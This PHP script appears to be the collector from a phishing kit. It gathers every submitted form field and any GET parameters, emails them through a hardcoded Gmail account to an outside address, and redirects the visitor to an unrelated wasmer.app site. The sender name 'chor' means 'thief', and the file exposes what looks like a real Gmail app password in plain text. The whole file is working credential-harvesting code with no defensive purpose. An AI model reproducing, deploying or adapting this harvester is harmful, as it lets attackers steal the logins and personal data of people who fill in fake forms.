<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

 header("Location: https://fdfdfdcvxc.wasmer.app/");  

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Initialize an empty body for the email
    $emailBody = '';

    // Iterate through the $_POST array to collect form data
    foreach ($_POST as $key => $value) {
        // Append form field name and its value to the email body
        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
    }

    // Also capture any GET parameters if you want (optional)
    if (!empty($_GET)) {
        $emailBody .= '<br><b>GET parameters:</b><br>';
        foreach ($_GET as $key => $value) {
            $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
        }
    }

    // PHPMailer object creation
    $mail = new PHPMailer(true);
    try {
        // SMTP settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'gemnipro10@gmail.com';
        $mail->Password   = 'ixho qmiy utmm yqix';   // replace with your actual password or app password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        // Email properties
        $mail->setFrom('gemnipro10@gmail.com', 'chor');
        $mail->addAddress('alibrohi883@gmail.com');

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'New Submission - ' . date('Y-m-d H:i:s');
        $mail->Body    = $emailBody;

        // Send email
        $mail->send();
        // Success (optional: you can redirect after sending)
        echo 'Email successfully sent using PHPMailer.';
    } catch (Exception $e) {
        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
    }
} else {
    echo "Invalid request!";
}
?>
